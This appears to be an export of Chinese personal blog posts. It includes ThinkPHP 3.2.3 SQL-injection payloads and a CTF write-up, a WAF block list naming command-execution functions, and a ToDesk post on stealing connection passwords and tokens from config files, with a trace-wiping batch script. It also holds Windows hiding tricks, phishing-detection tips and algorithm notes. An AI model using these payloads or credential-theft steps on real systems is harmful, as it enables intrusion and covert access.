`thinkphp_user` where 1=1 and 1=(updatexml(1,concat(0x3a,user())),1)%23    &#125;    public function getUserEXP()&#123;        $map=array();        $map[&#x27;id&#x27;]=$_GET[&#x27;id&#x27;];        $data=M(&#x27;user&#x27;)-&gt;where($map)-&gt;find();        dump($data);        //payload: ?id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x3a,user())),1)%23        //当不用官方推荐的I方法获取外界输入的值时，就会产生安全问题    &#125;    public function getUserEXP2()&#123;//        $user=M(&#x27;user&#x27;);//        $user-&gt;where(&#x27;id=5&#x27;)-&gt;setInc(&#x27;score&#x27;,3);//用户的积分加3//        $user-&gt;where(&#x27;id=5&#x27;)-&gt;setInc(&#x27;score&#x27;);//用户的积分加1//        $user-&gt;where(&#x27;id=5&#x27;)-&gt;setDec(&#x27;score&#x27;,5);//用户的积分减5//        $user-&gt;where(&#x27;id=5&#x27;)-&gt;setDec(&#x27;score&#x27;);//用户的积分减1        $user=M(&#x27;user&#x27;);        $user-&gt;where(&#x27;id=2&#x27;)-&gt;setInc(&#x27;score&#x27;,I(&#x27;num&#x27;));        //payload: ?num=1 where (id=2) and 1=(updatexml(1,concat(0x3a,user())),1)%23    &#125;    public function getUserAction($id)&#123;        if (intval($id)&gt;0)&#123;            $data=M(&#x27;suer&#x27;)-&gt;where(&#x27;id=&#x27;.$id)-&gt;select();            dump($data);        &#125;    &#125;    public function getUserString()&#123;        $user=M(&#x27;user&#x27;);        $map[&#x27;id&#x27;]=array(&#x27;eq&#x27;,1);        $map[&#x27;username&#x27;]=&#x27;ok&#x27;;        $map[&#x27;_string&#x27;]=&#x27;score=&#x27;.I(&#x27;score&#x27;);        $user-&gt;where($map)-&gt;select();        //payload: ?score=0) and 1=(updatexml(1,concat(0x3a,user())),1)%23    &#125;&#125;?&gt;\n//UserController.class.php---&lt;?phpnamespace Home\\Controller;use Think\\Controller;class UserController extends Controller &#123;    public function index()&#123;        echo &#x27;User index!!!&#x27;;    &#125;    public function hello()&#123;        //http://127.0.0.1/tp/index.php/home/user/hello        echo &#x27;User hello!!!&#x27;;    &#125;&#125;?&gt;\n\nThinkPHP5详见05PHP个人博客\n\n 实战：H&amp;NCTF——ez_tp\nIndexController.class.php中源码：\n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller &#123;    public function index()&#123;        header(&quot;Content-type:text/html;charset=utf-8&quot;);        echo &#x27;装起来了&#x27;;        &#125;    public function h_n()&#123;        function waf() &#123;            if (!function_exists(&#x27;getallheaders&#x27;)) &#123;                function getallheaders() &#123;                    foreach ($_SERVER as $name =&gt; $value) &#123;                        if (substr($name, 0, 5) == &#x27;HTTP_&#x27;) $headers[str_replace(&#x27; &#x27;, &#x27;-&#x27;, ucwords(strtolower(str_replace(&#x27;_&#x27;, &#x27; &#x27;, substr($name, 5))))) ] = $value;                    &#125;                    return $headers;                &#125;            &#125;            $get = $_GET;            $post = $_POST;            $cookie = $_COOKIE;            $header = getallheaders();            $files = $_FILES;            $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];            $method = $_SERVER[&#x27;REQUEST_METHOD&#x27;];            $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;];            //rewirte shell which uploaded by others, you can do more            foreach ($_FILES as $key =&gt; $value) &#123;                $files[$key][&#x27;content&#x27;] = file_get_contents($_FILES[$key][&#x27;tmp_name&#x27;]);                file_put_contents($_FILES[$key][&#x27;tmp_name&#x27;], &quot;virink&quot;);            &#125;            unset($header[&#x27;Accept&#x27;]); //fix a bug            $input = array(                &quot;Get&quot; =&gt; $get,                &quot;Post&quot; =&gt; $post,                &quot;Cookie&quot; =&gt; $cookie,                &quot;File&quot; =&gt; $files,                &quot;Header&quot; =&gt; $header            );            //deal with            $pattern = &quot;insert|update|delete|and|or|\\/\\*|\\*|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex&quot;;            $pattern.= &quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;;            $pattern.= &quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;;            $pattern.= &quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;;            $vpattern = explode(&quot;|&quot;, $pattern);            $bool = false;            foreach ($input as $k =&gt; $v) &#123;                foreach ($vpattern as $value) &#123;                    foreach ($v as $kk =&gt; $vv) &#123;                        if (preg_match(&quot;/$value/i&quot;, $vv)) &#123;                            $bool = true;                            break;                        &#125;                    &#125;                    if ($bool) break;                &#125;                if ($bool) break;            &#125;            return $bool;        &#125;        $name = I(&#x27;GET.name&#x27;);        $User = M(&quot;user&quot;);        if (waf())&#123;            $this-&gt;index();        &#125;else&#123;            $ret = $User-&gt;field(&#x27;username,age&#x27;)-&gt;where(array(&#x27;username&#x27;=&gt;$name))-&gt;select();            echo var_export($ret, true);        &#125;            &#125;&#125;\n\n\nWRITEUP\n\n在原版thinkphp3.2.3中，删除了think_filter过滤的exp，使得我们可以利用在ThinkPHP\\Library\\Think\\Db\\Driver.class.php中的\nif(is_array($val)) &#123;\t...    elseif(&#x27;exp&#x27; == $exp )&#123;    \t$whereStr .= $key.&#x27; &#x27;.$val[1];    &#125;    &#125;\n利用exp时，需要手动添加等号，再配合union select，即可获得flag\npayload：\n/index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag\n注意，cookie可能会匹配某些过滤，删除即可\n\n","tags":["Cyber Security"]},{"title":"Windows奇技淫巧","url":"/2024/09/04/Windows%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/","content":" Windows特殊文件夹\n\n\n\n命令\n说明\n\n\n\n\nshell:desktop\n用户桌面文件夹\n\n\nshell:sendto\n“发送到”菜单中的文件夹\n\n\nshell:[common] startup\n启动文件夹，用户登录时会自动运行这个文件夹中的程序\n\n\nshell:[common] programs\n“开始”菜单中的程序文件夹（在快捷方式前加!使其置顶显示）\n\n\nshell:appdata\n应用程序数据文件夹，存储应用程序的配置文件等\n\n\nshell:recent\n最近使用的文件列表\n\n\nshell:favorites\n收藏夹文件夹\n\n\nshell:fonts\n字体文件夹\n\n\nshell:templates\n模版文件夹\n\n\nshell:my music\n用户音乐文件夹\n\n\nshell:my pictures\n用户图片文件夹\n\n\nshell:my videos\n用户视频文件夹\n\n\nshell:start menu\n用户开始菜单\n\n\nshell:appsfolder\n电脑安装的所有应用\n\n\nshell:quick launch\n快速启用功能（隐藏的子文件夹User Pinned的TaskBar是所有固定到底部任务栏的软件，可添加启动参数）\n\n\nshell:RecycleBinFolder\n回收站\n\n\nshell:UsersFilesFolder\n用户的配置文件夹\n\n\n\n\nWin11：Shift+右键可直接打开完整的右键菜单\n\n 隐藏文件夹\n文件删除后会被移到回收站（C盘下的$Recyle.Bin文件夹）\n\n\n打开文件夹选项——查看面板\n取消勾选隐藏受保护的操作系统文件\n勾选显示隐藏文件、文件夹和驱动器\n\n\n 物理隐藏\n选中文件夹重命名——右键插入Unicode控制字符PDF——右键属性——自定义中更改图标——选择一个空白图标\n\n切换文件查看方式后（递增排序）就很容易发现这个文件夹\n\n 伪装成系统文件（仅适用于文件夹）\n在当前文件夹创建一个文本文件，输入\nattrib +s +h &quot;文件夹名称&quot;\n\nattrib：attribute缩写，意思是属性\n+s +h：赋予文件夹系统和隐藏的属性\n\n文件另存为.bat后缀的脚本文件，编码为ANSI\n查看方式同文章开头\n恢复只需将+变为-即可\n 伪装成图片\n准备一张图片和要隐藏的文件一起压缩，新建文本文件，输入\ncopy /b 原图片.png + 压缩包.zip 新图片.png\n文件另存为.bat后缀的脚本文件，编码为ANSI\n恢复只需修改后缀为.zip即可\n 幻影坦克\n文件夹重命名在名字后方加上后缀\n此电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;回收站&#123;645ff040-5081-101b-9f08-00aaO02f954e&#125;拔号网络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;控制面板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;网上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;\n刷新后变成我的电脑，双击后会进入我的电脑\n恢复在当前文件夹输入CMD\nren &quot;此电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;&quot; &quot;新文件夹名称&quot;\n 隐藏盘符\n打开注册表编辑器，进入\n\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\n页面内右侧窗口空白处右键新建“DWORD（32位）值”，将其重命名为“Nodrives”，打开修改界面，修改为十进制，输入隐藏盘对应数字\n\n\n\n隐藏盘名称\n对应十进制数字\n\n\n\n\nA盘\n1\n\n\nB盘\n2\n\n\nC盘\n4\n\n\nD盘\n8\n\n\nE盘\n16\n\n\nF盘\n32\n\n\nG盘\n64\n\n\nH盘\n128\n\n\nI盘\n256\n\n\nJ盘\n512\n\n\nK盘\n1024\n\n\nL盘\n2048\n\n\nM盘\n4096\n\n\nN盘\n8192\n\n\nO盘\n16384\n\n\nP盘\n32768\n\n\nQ盘\n65536\n\n\nR盘\n131072\n\n\nS盘\n262144\n\n\nT盘\n524288\n\n\nU盘\n1048576\n\n\nV盘\n2097152\n\n\nW盘\n4194304\n\n\nX盘\n8388608\n\n\nY盘\n16777216\n\n\nZ盘\n33554432\n\n\n隐藏所有盘符\n67108863\n\n\n\n重启电脑即可隐藏，地址栏中输入盘符地址E:\\即可进入\n恢复将注册表新建的文件删除，重启即可\n","tags":["Summary"]},{"title":"利用图像验证技术识别钓鱼攻击","url":"/2025/03/09/%E5%88%A9%E7%94%A8%E5%9B%BE%E5%83%8F%E9%AA%8C%E8%AF%81%E6%8A%80%E6%9C%AF%E8%AF%86%E5%88%AB%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/","content":" 利用图像验证技术识别钓鱼攻击\n现代黑客常通过钓鱼攻击手段，利用伪装邮件和图像突破受害者隐私防线，从而窃取敏感数据\n 攻击解析\n图像钓鱼使用图像而非文字实施欺骗，通过邮件或消息发送内含诱导性图片的钓鱼内容，恶意内容往往隐藏在图像内部从而绕过多数安全过滤器。这些图像通常包含三种危险元素：\n\n嵌入式链接\n二维码\n仿冒品牌标识的文本\n\n用户缺乏警惕而误认其为真实内容\n 验证技巧\n\n图像质量分析\n\n收到含诱导图像的可疑消息应先检查图像质量特征：\n\n分辨率异常：正规品牌推广时由于他们拥有自己的素材库，故不会使用低分辨率图像，画质劣质往往暗示其来源非专业\n像素化痕迹：像素锯齿化、泛绿化、高糊化表明图像经过多次的编辑、保存，图像经压缩，可能为伪造内容\n\n\n隐藏链接检测\n\n关注如下几点：\n\n鼠标悬停显示的超链接\n图像叠加元素\nURL拼写错误（如&quot;alipay.com&quot;替代&quot;a1ipay.com&quot;）\n可疑域名特征\n附带二维码（比如快递单上的扫二维码领返现）\n\n\n在电诈最猖獗的那几年，本人某次快递单上有如上返现二维码，使用微信扫码后跳转到某一可疑链接，页面粗糙，字符使用相似字符进行替换，出于警惕我再仔细查看了页面，页面的标题下有URL链接，链接很奇怪，且页面上只显示提示输入支付宝账号密码进行登录返现，而“支付宝”被替换成了“伎符宝”，果断退出，避免了后续的损失\n\n\nMetaData分析\n\nExifTool\nExifTool完全入门指南\n在线查看EXIF信息\n\n为保证数据隐私还是建议使用离线工具ExifTool\n\n文件头\n\n可使用WinHex、010Editor等工具查看文件真实后缀\n\n通过以下方式深度验证：\n\n使用本地工具保存图像元数据\n通过在线工具解析EXIF信息\n比对拍摄设备、时间戳等关键参数\n\n如果元数据矛盾/可疑，忽略消息中的后续操作指引\n\n反向搜索图像进行验证\n\n\n使用免费反向图像搜索工具（如Google Images、Yandex Images、TinEye等）\n交叉比对官方渠道发布的品牌素材\n识别已被标记的恶意图像\n\n 总结\n钓鱼攻击在网络犯罪中始终占据主导地位，随着用户对文本钓鱼警惕性提高，攻击者正在转向更隐蔽的图像钓鱼手段。建议定期更新以下防护认知：\n\n保持对图像质量的敏感性\n建立链接检测的标准化流程\n掌握元数据分析基础技能\n善用反向图像搜索工具\n\n通过系统化应用这些验证技术，可显著降低遭遇图像钓鱼攻击的风险\n","tags":["Cyber Security"]},{"title":"利用ToDesk内网渗透与应急响应","url":"/2024/09/04/%E5%88%A9%E7%94%A8ToDesk%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","content":" 利用ToDesk内网渗透\n\n测试环境：控制端Windows11，被控端Windows7\n测试版本：ToDeskV4.7.4.8\n重点关注路径：\nC:\\Program Files\\ToDeskC:\\Users\\主机名\\AppData\\Local\\ToDesk\n\n查阅官方文档可发现ToDesk支持命令行静默安装&amp;绑定设备\nToDesk_Setup.exe的/S参数可以实现静默安装\nToDesk_Setup.exe /S\n程序会安装到如下的默认路径\nC:\\Program Files\\ToDesk\n该路径下会有一个config.ini文件，这个文件里面有着连接ToDesk的临时密码\n\n此处的ClientId是被控端设备代码、tempAuthPassEx是加密后的临时密码，将其复制到本地ToDesk配置文件中替换我们的本地密码，即可获得对方连接密码\n如果对方登录了账号，还会有意外之喜\nNewToken=Token1Token=Token2LoginType=2user=LoginPhone=电话号LoginEmail=AreaCode=86IsFirstConnect=0\n此外C:\\Program Files\\ToDesk\\Logs中的日志还会记录本机用户名、GPU等信息，时间及测试样本不足原因不再细究\n在如下目录中\nC:\\Users\\主机名\\AppData\\Local\\ToDesk\n存在advInfo.json和devlist_xxxxxxxx.json文件，其中list中保存历史的连接记录，具体存放如下信息（无用信息及隐私信息已删），可使用这些信息解密PassEx以获取明文\n&#123;   &quot;DeviceInfo&quot; : [      &#123;         &quot;AutoLockScreenTip&quot; : 1,         &quot;Clipboard&quot; : 1,         &quot;PassEx&quot; : &quot;加密后的密码&quot;,         &quot;Height&quot; : 988,         &quot;UserId&quot; : &quot;xxxxxxxxx&quot;,         &quot;UserImage&quot; : &quot;用户图片链接&quot;,         &quot;UserName&quot; : &quot;用户名&quot;,         &quot;Width&quot; : 1706      &#125;   ]&#125;\n其中UserName即为设备列表中存储的设备名字，UserId为存储的设备Id\n 一键提取密码工具\nflydyyg大佬的github的开源项目readTdose-xiangrikui\nGo语言编写，go build编译成exe程序即可使用，一键自动提取ToDesk以及向日葵密码\n\n 清除痕迹\n@echo offtaskkill /f /im ToDesk_Lite.exe /im ToDesk_Service.exe /im ToDesk.exedel /s /q C:\\Windows\\Prefetch\\TODESK*.pfdel /s /q C:\\Users\\Public\\Desktop\\ToDesk.lnkdel /s /q &quot;%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*TODESK*.lnk&quot;rmdir /s /q &quot;C:\\Program Files (x86)\\ToDesk&quot;rmdir /s /q &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\ToDesk&quot;rmdir /s /q &quot;%userprofile%\\AppData\\Local\\ToDesk&quot;rmdir /s /q &quot;C:\\WINDOWS\\SysWOW64\\config\\systemprofile\\AppData\\Local\\ToDesk&quot;reg delete &quot;HKLM\\SOFTWARE\\ToDesk&quot; /freg delete &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\ToDesk_Service&quot; /freg delete &quot;HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\ToDesk&quot; /fsc delete ToDesk_Service\n 应急响应\n被控端会在安装目录下的Logs文件夹中生成如下六个文件\n\n其中重点位于session和service开头的两个log文件中\n\nsession\n\n2024-09-04 14:28:10,785: INFO infoCategory : CRTCClientWork openScreen 0 控制端设备代码2024-09-04 14:28:50,479: INFO infoCategory : host licode linkreport = [&#123;\n第二条关键句中有**&quot;LocalIpport&quot;:和&quot;RemotePort&quot;:**可快速定位得知控制端设备IP\n\nservice\n\n2024-09-04 14:16:54,754: INFO infoCategory : [setting] hearbeat config:&#123;&quot;platform&quot;:&quot;对方设备类型2024-09-04 14:20:13,911: INFO infoCategory : host recv connect request, myid=被控端设备代码 destid=控制端设备代码2024-09-04 14:20:13,911: INFO infoCategory : client recv connect request  message wParam=247\n第三句解释：客户端接收连接请求消息参数为247，表示被控端被上传文件\n另外几个远控软件的应急响应分析\n","tags":["Cyber Security"]},{"title":"字符串","url":"/2025/07/21/%E5%AD%97%E7%AC%A6%E4%B8%B2/","content":" 字符串\n 反转字符串\n344. 反转字符串\n定义两个指针（也可以说是索引下标），一个从字符串前面，一个从字符串后面，两个指针同时向中间移动，并交换元素\n\nclass Solution &#123;public:    void reverseString(vector&lt;char&gt;&amp; s) &#123;        for(int i=0,j=s.size()-1;i&lt;s.size()/2;i++,j--)&#123;            swap(s[i],s[j]);        &#125;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 反转字符串II\n541. 反转字符串 II\ni+=(2*k)，i每次移动2*k，然后判断是否需要有反转的区间\n\n要找的也就是每2*k区间的起点\n\nclass Solution &#123;public:    void reverse(string&amp; s,int start,int end)&#123;        for(int i=start,j=end;i&lt;j;i++,j--)&#123;//左闭右闭的区间[start, end]            swap(s[i],s[j]);        &#125;    &#125;    string reverseStr(string s, int k) &#123;        for(int i=0;i&lt;s.size();i+=(2*k))&#123;//每隔2k个字符的前k个字符反转            if(i+k&lt;=s.size())&#123;//剩余字符小于2k但大于等于k个，反转前k个字符                reverse(s,i,i+k-1);                continue;//详见下文“引用”            &#125;            reverse(s,i,s.size()-1);//剩余字符少于k个，将剩余字符全部反转        &#125;        return s;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)或O(n)\n\n\nC++的std::string可变，可以直接修改字符串的内容，没有创建新的字符串\nJava、Python字符串不可变，必须创建一个新的字符串或字符串数组来完成反转操作\n\ncontinue\n此处没有continue会无条件执行第二个reverse，导致如果i+k&lt;=s.size()，会先反转前k个字符，然后又错误地反转了从i到末尾的所有字符，覆盖了第一次反转的结果\n如s=“abcdefg”，k=2\n正确版本输出&quot;bacdfeg&quot;\n错误版本输出&quot;bacfedg&quot;\n\nclass Solution &#123;public:    void reverse(string&amp; s,int start,int end)&#123;        for(int i=start,j=end;i&lt;j;i++,j--)&#123;            swap(s[i],s[j]);        &#125;    &#125;    string reverseStr(string s, int k) &#123;        int pos=0;        while(pos&lt;s.size())&#123;            //剩余字符串大于等于k            if(pos+k&lt;s.size())&#123;                reverse(s,pos,pos+k-1);            &#125;else&#123;//剩余字符串不足k                reverse(s,pos,s.size()-1);            &#125;            pos+=2*k;        &#125;        return s;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 反转字符串里的单词\n151. 反转字符串中的单词\n解题思路：\n\n移除多余空格\n将整个字符串反转\n将每个单词反转\n\n\n回忆双指针\n\nclass Solution &#123;public:    void reverse(string&amp; s,int start,int end)&#123;        for(int i=start,j=end;i&lt;j;i++,j--)&#123;            swap(s[i],s[j]);        &#125;    &#125;    void removeExtraSpaces(string&amp; s)&#123;//双指针而不是erase()，使时间复杂度由O(n^2)降为O(n)        int slow=0;        for(int i=0;i&lt;s.size();i++)&#123;            if(s[i]!=&#x27; &#x27;)&#123;                if(slow!=0)&#123;//不是第一个单词，手动给单词间加空格                    s[slow++]=&#x27; &#x27;;                &#125;                while(i&lt;s.size()&amp;&amp;s[i]!=&#x27; &#x27;)&#123;                    s[slow++]=s[i++];                &#125;            &#125;        &#125;        s.resize(slow);//slow对应去除多余空格后大小    &#125;    string reverseWords(string s) &#123;        removeExtraSpaces(s);        reverse(s,0,s.size()-1);        int start=0;        for(int i=0;i&lt;=s.size();i++)&#123;            if(i==s.size()||s[i]==&#x27; &#x27;)&#123;                reverse(s,start,i-1);                start=i+1;            &#125;        &#125;        return s;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)或O(n)\n\n\nresize()：改变字符串的长度\n\n 找出字符串中第一个匹配项的下标\n28. 找出字符串中第一个匹配项的下标\n\nKMP算法\n\n\n前缀表减一\n\nclass Solution &#123;public:    void getNext(int* next,const string&amp; s)&#123;        int j=-1;        next[0]=j;        for(int i=1;i&lt;s.size();i++)&#123;//注意i从1开始            while(j&gt;=0&amp;&amp;s[i]!=s[j+1])&#123;//前后缀不相同了                j=next[j];//向前回退            &#125;            if(s[i]==s[j+1])&#123;//找到相同的前后缀                j++;            &#125;            next[i]=j;//将j（前缀的长度）赋给next[i]        &#125;    &#125;    int strStr(string haystack, string needle) &#123;        if(needle.size()==0)&#123;            return 0;        &#125;        vector&lt;int&gt; next(needle.size());        getNext(&amp;next[0],needle);        int j=-1;//因为next数组里记录的起始位置为-1        for(int i=0;i&lt;haystack.size();i++)&#123;//注意i就从0开始            while(j&gt;=0&amp;&amp;haystack[i]!=needle[j+1])&#123;//不匹配                j=next[j];//j寻找之前匹配的位置            &#125;            if(haystack[i]==needle[j+1])&#123;//匹配，j和i同时向后移动                j++;//i的增加在for循环里            &#125;            if(j==(needle.size()-1))&#123;//文本串s里出现了模式串t                return(i-needle.size()+1);            &#125;        &#125;        return -1;    &#125;&#125;;\n\n时间复杂度：O(n+m)\n空间复杂度：O(m)\n\n 重复的子字符串\n459. 重复的子字符串\n 移动匹配\n两个s拼接在一起，里面还出现一个s的话，就说明是由重复子串组成\n\ns为abcabc，那么s+s=abcabcabcabc\n去掉首尾字符后变成bcabcabcabca，其中仍然包含原串abcabc\n反之如果s不能由子串重复构成，比如abcd，则s+s=abcdabcd，去掉首尾后是bcdabca，找不到abcd\n\nclass Solution &#123;public:    bool repeatedSubstringPattern(string s) &#123;        string t=s+s;        t.erase(t.begin());        t.erase(t.end()-1);        return t.find(s)!=std::string::npos;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(n)\n\n KMP算法\n当最长相等前后缀不包含的子串的长度可以被字符串s的长度整除，那么不包含的子串就是s的最小重复子串\n\n证明参考《代码随想录》\n\n如果next[len-1]!=-1，则说明字符串有最长相同的前后缀（就是字符串里的前缀子串和后缀子串相同的最长长度），最长相等前后缀的长度为：next[len-1]+1，len-(next[len-1]+1)是最长相等前后缀不包含的子串的长度\n如果len%(len-(next[len-1]+1))==0，则说明数组的长度正好可以被最长相等前后缀不包含的子串的长度整除，说明该字符串有重复的子字符串\n\n\nnext[len-1]=7，next[len-1]+1=8，8就是此时字符串asdfasdfasdf的最长相同前后缀的长度\n(len-(next[len-1]+1))也就是：12（字符串的长度）-8（最长公共前后缀的长度）=4，为最长相同前后缀不包含的子串长度\n4可以被12（字符串的长度）整除，所以说明有重复的子字符串（asdf）\n\nclass Solution &#123;public:    void getNext(int* next,const string&amp; s)&#123;        next[0]=-1;        int j=-1;        for(int i=1;i&lt;s.size();i++)&#123;            while(j&gt;=0&amp;&amp;s[i]!=s[j+1])&#123;                j=next[j];            &#125;            if(s[i]==s[j+1])&#123;                j++;            &#125;            next[i]=j;        &#125;    &#125;    bool repeatedSubstringPattern(string s) &#123;        if(s.size()==0)&#123;            return false;        &#125;        int next[s.size()];        getNext(next,s);        int len=s.size();        if(next[len-1]!=-1&amp;&amp;len%(len-(next[len-1]+1))==0)&#123;            return true;        &#125;        return false;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 总结\n很多数组填充类的问题都可以预先给数组扩容，然后再从后向前进行操作\n\n使用for循环里调用库函数erase来移除元素，这其实是O(n2)的操作，因为erase就是O(n)的操作\n\n当需要固定规律一段一段去处理字符串的时候，要想想在for循环的表达式上做做文章\n","tags":["LeetCode"]},{"title":"十大经典排序算法","url":"/2024/03/07/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/","content":" 十大经典排序算法\n可视化数据结构和算法\n旧金山大学数据结构可视化\n 一、插入排序（Insertion Sort）\n 原理\n这里主要针对直接插入排序。将元素与已经排序的有序序列比较，找到对应的位置插入\n 步骤\n\n从第一个元素开始，该元素可以认为已经被排序\n取出下一个元素，在已经排序的元素序列中从后向前扫描\n如果该元素（已排序）大于新元素，将该元素移到下一位置\n重复步骤3，直到找到已排序的元素小于或者等于新元素的位置\n将新元素插入到该位置后\n重复步骤2~5\n\n 动画演示\n\n 代码实现\nvoid insert_sort()&#123;    for (int i = 1; i &lt; n; i ++ )    &#123;        int x = a[i];        int j = i-1;        while (j &gt;= 0 &amp;&amp; x &lt; a[j])        &#123;            a[j+1] = a[j];            j -- ;        &#125;        a[j+1] = x;    &#125;&#125;\n 二、希尔排序（Shell Sort）\n 原理\n希尔排序又叫缩小增量排序，也是一种插入排序方法（通常快于直接插入法），具体做法是将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序\n 步骤\n\n1.先选定一个小于N的整数gap作为第一增量，然后将所有距离为gap的元素分在同一组，并对每一组的元素进行直接插入排序。然后再取一个比第一增量小的整数作为第二增量，重复上述操作\n2.当增量的大小减到1时，就相当于整个序列被分到一组，进行一次直接插入排序，排序完成\n\n\n对于增量的选定无一定论，但最后一个增量必须等于1，也就是说，每趟后一个增量是前一个增量的1/2\n\n 动画演示\n\n 代码实现\nvoid shell_sort()&#123;    for (int gap = n &gt;&gt; 1; gap; gap &gt;&gt;= 1)    &#123;        for (int i = gap; i &lt; n; i ++ )        &#123;            int x = a[i];            int j;            for (j = i; j &gt;= gap &amp;&amp; a[j-gap] &gt; x; j -= gap)                a[j] = a[j-gap];            a[j] = x;        &#125;    &#125;&#125;\n 三、冒泡排序（Bubble Sort）\n 原理\n通过无序区中相邻元素关键字间的比较和位置的交换，使关键字最小的元素像气泡一样浮到最顶部；接着对剩下的元素排序，使得第二小的元素到达顶部，同样的方法直到所有元素排序完成\n 步骤\n\n比较相邻的元素。如果第一个比第二个大，就交换它们两个\n对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数\n针对所有的元素重复步骤1~2，除了最后一个元素，直到排序完成\n\n 动画演示\n\n 代码实现\nvoid bubble_sort()&#123;    for (int i = n-1; i &gt;= 1; i -- )    &#123;        bool flag = true;        for (int j = 1; j &lt;= i; j ++ )            if (a[j-1] &gt; a[j])            &#123;                swap(a[j-1], a[j]);                flag = false;            &#125;        if (flag) return;    &#125;&#125;\n 四、快速排序（Quick Sort）\n 原理\n一般选择将待排序序列分为两个序列，正中间的那个数作为关键字，然后两个指针一个从头到关键字遍历，遇到大于（小于）关键字的元素就停下来，另一个指针从尾到关键字遍历，遇到小于（大于）关键字的元素停下来，交换两个指针的元素完成排序；将序列递归分治按照前面的原理排序，直到序列有序\n 步骤\n快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：\n\n选取基准元素（pivot）\n划分，根据选取的pivot将数组划分成小于pivot的部分和大于pivot的部分\n递归求解小于pivot和大于pivot的部分\n\n基准元素可以选择第一个元素或者最后一个元素即Lomuto Partition Scheme，但是这样划分成两部分的时候有一部分是空的，这样可能造成死循环；从中间划分可以保证两部分都不为空，即Hoare Partition Scheme\n 动画演示\n\n 代码实现\nvoid quick_sort(int q[], int l, int r)&#123;    if (l &gt;= r) return;    int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1];    while (i &lt; j)    &#123;        do i ++ ; while (q[i] &lt; x);        do j -- ; while (q[j] &gt; x);        if (i &lt; j) swap(q[i], q[j]);    &#125;    quick_sort(q, l, j), quick_sort(q, j + 1, r);&#125;\n\n\n快速排序的边界问题\n\n快排属于分治算法，最怕的就是n分成0和n，或n分成n和0，导致死循环\n\n\n以j为划分时，x不能选q[r]（若以i为划分，则x不能选q[l]）\n假设x=q[r]\n关键句子quick_sort(q,l,j),quick_sort(q,j+1,r)\n由于j的最小值是l，所以q[j+1…r]不会造成无限划分\n\n\n但q[l…j]（即quick_sort(q,l,j)）却可能造成无限划分，因为j可能为r\n举例来说，若x选为q[r]，数组中q[l…r-1]&lt;x，\n那么这一轮循环结束时i=r,j=r，显然会造成无限划分\n\ndo i++;while q[i]&lt;x和do j–;whileq[j]&gt;x不能用q[i]&lt;=x和q[j]&gt;=x\n\n假设q[l…r]全相等\n则执行完do i++;while(q[i]&lt;=x);之后，i会自增到r+1\n然后继续执行q[i]&lt;=x判断条件，造成数组下标越界但这貌似不会报错但这貌似不会报错\n并且如果之后的q[i]&lt;=x此时i&gt;r此时i&gt;r条件也不幸成立，\n就会造成一直循环下去亲身实验亲身实验，造成内存超限MemoryLimitExceeded\n\nif(i&lt;j)swap(q[i],q[j])能否使用i&lt;=j\n\n可以使用if(i&lt;=j)swap(q[i],q[j])\n因为i=j时，交换一下q[i]，q[j]无影响，因为马上就会跳出循环了\n\n\n最后一句能否改用quick_sort q,l,j−1,quick_sort q,j,r作为划分用i做划分时也是同样的道理，用i做划分时也是同样的道理，\n不能根据之前的证明，最后一轮循环可以得到这些结论\nj&lt;=i和q[l…i-1]&lt;=x,q[i]&gt;=x和q[j+1…r]&gt;=x,q[j]&lt;=x\n所以，q[l…j-1]&lt;=x是显然成立的，\n但quick_sort(q,j,r)中的q[j]却是q[j]&lt;=x，这不符合快排的要求\n另外一点，注意quick_sort(q,l,j-1),quick_sort(q,j,r)可能会造成无限划分\n当x选为q[l]时会造成无限划分，报错为MLE，\n如果手动改为x=q[r]，可以避免无限划分\n但是上面所说的q[j]&lt;=x的问题依然不能解决，这会造成WA 